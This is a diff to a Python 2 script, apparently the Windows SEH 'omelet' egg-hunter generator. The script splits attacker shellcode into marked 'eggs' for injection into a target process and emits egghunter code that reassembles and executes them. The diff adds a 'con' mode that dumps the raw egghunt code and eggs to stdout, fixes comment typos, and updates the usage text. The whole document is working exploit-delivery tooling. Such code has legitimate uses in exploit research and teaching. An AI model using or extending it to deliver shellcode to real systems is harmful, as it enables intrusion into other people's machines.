@@ -44,33 +44,49 @@ def Main(my_name, bin_file, shellcode_file, output_file, egg_size = '0x7F', mark
   code = code[:marker_bytes_location] + marker_bytes_string + code[marker_bytes_location+3:]
   code = code[:max_index_location] + max_index_string + code[max_index_location+1:]
   code = code[:egg_size_location] + egg_size_string + code[egg_size_location+1:]
-  output = [
-    '// This is the binary code that needs to be executed to find the eggs, ',
-    '// recombine the orignal shellcode and execute it. It is %d bytes:' % (
-      len(code),),
-    'omelet_code = "%s";' % HexEncode(code),
-    '',
-    '// These are the eggs that need to be injected into the target process ',
-    '// for the omelet shellcode to be able to recreate the original shellcode',
-    '// (you can insert them as many times as you want, as long as each one is',
-    '// inserted at least once). They are %d bytes each:' % (egg_size,) ]
-  egg_index = 0 
-  while shellcode:
-    egg = egg_size_string + chr(egg_index ^ 0xFF) + marker_bytes_string
-    egg += shellcode[:egg_size - 5]
-    if len(egg) < egg_size:
-      # tail end of shellcode is smaller than an egg: add pagging:
-      egg += '@' * (egg_size - len(egg))
-    output.append('egg%d = "%s";' % (egg_index, HexEncode(egg)))
-    shellcode = shellcode[egg_size - 5:]
-    egg_index += 1
-  open(output_file, 'w').write('\n'.join(output))
+  if (output_file.lower() == "con"):
+    # Output to stdout: dump raw egghunt code and eggs:
+    output = code
+    egg_index = 0 
+    while shellcode:
+      egg = egg_size_string + chr(egg_index ^ 0xFF) + marker_bytes_string
+      egg += shellcode[:egg_size - 5]
+      if len(egg) < egg_size:
+        # tail end of shellcode is smaller than an egg; add padding:
+        egg += '@' * (egg_size - len(egg))
+      output += egg
+      shellcode = shellcode[egg_size - 5:]
+      egg_index += 1
+    print output,
+  else:
+    output = [
+      '// This is the binary code that needs to be executed to find the eggs, ',
+      '// recombine the orignal shellcode and execute it. It is %d bytes:' % (
+        len(code),),
+      'omelet_code = "%s";' % HexEncode(code),
+      '',
+      '// These are the eggs that need to be injected into the target process ',
+      '// for the omelet shellcode to be able to recreate the original shellcode',
+      '// (you can insert them as many times as you want, as long as each one is',
+      '// inserted at least once). Each egg is %d bytes and marked with "%s":' % (
+          egg_size, HexEncode(marker_bytes_string)) ]
+    egg_index = 0 
+    while shellcode:
+      egg = egg_size_string + chr(egg_index ^ 0xFF) + marker_bytes_string
+      egg += shellcode[:egg_size - 5]
+      if len(egg) < egg_size:
+        # tail end of shellcode is smaller than an egg; add padding:
+        egg += '@' * (egg_size - len(egg))
+      output.append('egg%d = "%s";' % (egg_index, HexEncode(egg)))
+      shellcode = shellcode[egg_size - 5:]
+      egg_index += 1
+    open(output_file, 'w').write('\n'.join(output))
 
 if __name__ == '__main__':
   if len(sys.argv) == 1 or sys.argv[1] in ('-h', '-?', '/h', '/?'):
     print """Syntax:
-    w32_SEH_omelet.py "omelet bin file" "shellcode bin file" "output txt file"
-        [egg size] [marker bytes]
+    w32-seh-omelet-shellcode.py "omelet bin file" "shellcode bin file"
+                                 "output txt file" [egg size] [marker bytes]
 
 Where:
     omelet bin file = The omelet shellcode stage binary code followed by three
@@ -80,7 +96,8 @@ Where:
                       the eggs and reconstructed by the omelet shellcode stage
                       code.
     output txt file = The file you want the omelet egg-hunt code and the eggs
-                      to be written to (in text format).
+                      to be written to (in text format). Use "con" to output
+                      the raw egghunt code and eggs to stdout.
     egg size =        The size of each egg (legal values: 6-127, default: 127)
     marker bytes =    The value you want to use as a marker to distinguish the
                       eggs from other data in user-land address space (legal
